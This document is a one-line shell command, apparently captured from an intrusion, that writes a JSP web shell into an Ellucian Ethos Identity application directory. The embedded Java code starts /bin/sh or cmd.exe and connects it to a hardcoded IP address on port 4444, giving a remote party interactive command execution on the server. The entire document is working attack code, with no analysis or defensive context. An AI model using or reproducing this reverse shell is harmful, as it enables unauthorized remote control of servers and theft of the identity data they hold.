echo "<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream rQ;
    OutputStream hr;

    StreamConnector( InputStream rQ, OutputStream hr )
    {
      this.rQ = rQ;
      this.hr = hr;
    }

    public void run()
    {
      BufferedReader nr  = null;
      BufferedWriter j8m = null;
      try
      {
        nr  = new BufferedReader( new InputStreamReader( this.rQ ) );
        j8m = new BufferedWriter( new OutputStreamWriter( this.hr ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = nr.read( buffer, 0, buffer.length ) ) > 0 )
        {
          j8m.write( buffer, 0, length );
          j8m.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( nr != null )
          nr.close();
        if( j8m != null )
          j8m.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "185.32.126.201", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
" >> /u01/app/eis/EllucianEthosIdentity/huilu.jsp